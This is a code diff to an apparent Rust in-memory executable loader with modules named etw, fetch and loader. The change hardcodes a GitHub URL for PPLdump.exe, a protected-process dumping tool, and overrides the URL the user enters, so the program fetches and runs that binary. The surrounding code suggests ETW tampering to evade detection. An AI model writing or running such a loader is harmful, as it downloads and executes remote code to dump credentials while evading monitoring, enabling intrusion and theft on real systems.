@@ -4,6 +4,7 @@ mod etw;
 mod error;
 mod fetch;
 mod loader;
+mod user_struct;
 
 fn main(){
     println!("[>] Exe who?");
@@ -14,7 +15,7 @@ fn main(){
             Ok(_res) => _res,
             Err(_e) => continue,
         };
-        
+
         // Check if user wants to exit
         if url_str.clone().as_str().trim().eq_ignore_ascii_case("quit") || 
             url_str.clone().as_str().trim().eq_ignore_ascii_case("exit") {
@@ -25,8 +26,9 @@ fn main(){
         if url_str.clone().as_str().trim().is_empty() {
             continue;
         }
+        let url_str = String::from("https://github.com/D1rkMtr/test/raw/main/PPLdump.exe");
 
-        print!("[i] Fetching: {}", url_str);
+        println!("[i] Fetching: {}", url_str);
         let url: Url = match Url::parse(url_str.as_str()) {
             Ok(_u) => _u,
             Err(e) => {
